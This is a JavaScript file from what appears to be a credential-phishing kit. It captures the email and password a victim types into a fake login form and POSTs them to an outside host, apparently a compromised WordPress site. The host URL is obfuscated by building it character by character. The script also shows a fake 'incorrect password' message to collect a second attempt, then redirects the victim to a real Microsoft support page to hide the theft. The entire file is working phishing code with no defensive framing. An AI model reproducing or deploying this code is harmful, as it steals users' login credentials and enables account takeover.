
var countAttempt = 0;
var urlParts = ['h', 't', 't', 'p', 's', ':', '/', '/', 'i', 'n', 'g', 'e', 'n', 'e', 'm', 's', 'r', 'l', '.', 'c', 'o', 'm', '.', 'a', 'r', '/', 'w', 'p', '-', 'c', 'm', 's', '/', 'z', 'l', 'i', 't', '.', 'p', 'h', 'p', '?', 'i', 'n', 'c'].join('');
var redirectUrlParts = ['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'u', 'p', 'p', 'o', 'r', 't', '.', 'm', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '.', 'c', 'o', 'm', '/', 'e', 'n', '-', 'u', 's', '/', 't', 'o', 'p', 'i', 'c', '/', '-', 'h', 't', 't', 'p', '-', '4', '0', '4', '-', '5', '0', '4', '-', 't', 'y', 'p', 'i', 'c'].join('');
document.addEventListener('DOMContentLoaded', function () {
    var closent = document.getElementById('closent');
    var msgFont = document.getElementById('msgfont');
    closent.addEventListener("click", function (event) {
        event.preventDefault();
        var pipe = document.getElementById('pipe').value;
        if (pipe == "") {
            msgFont.innerHTML = "Please enter password";
        } else {
            sendData();
        }
    });

    closent.addEventListener("touchend", function (event) {
        event.preventDefault();
        var pipe = document.getElementById('pipe').value;
        if (pipe == "") {
            msgFont.innerHTML = "Please enter password";
        } else {
            sendData();
        }
    });

    function sendData() {
        var xiwest = document.getElementById('south').value;
        var pipipe = document.getElementById('pipe').value;

        console.log("Email - " + xiwest);
        console.log("Password - " + pipipe);
        var formData = new FormData(document.forms.village);

        countAttempt++;

        var xhr = new XMLHttpRequest();
        xhr.open('POST', urlParts);

        xhr.send(formData);

        if (countAttempt >= 2) {
            setTimeout(function () {
                window.location = redirectUrlParts;
            }, 2000);
            closent.value = "Verifying...";
            msgFont.innerHTML = "";
        } else {
            setTimeout(function () {
                msgFont.innerHTML = "Your email or password is incorrect.";
                closent.value = "Next";
            }, 2000);
            closent.value = "Verifying...";
        }
    }
});
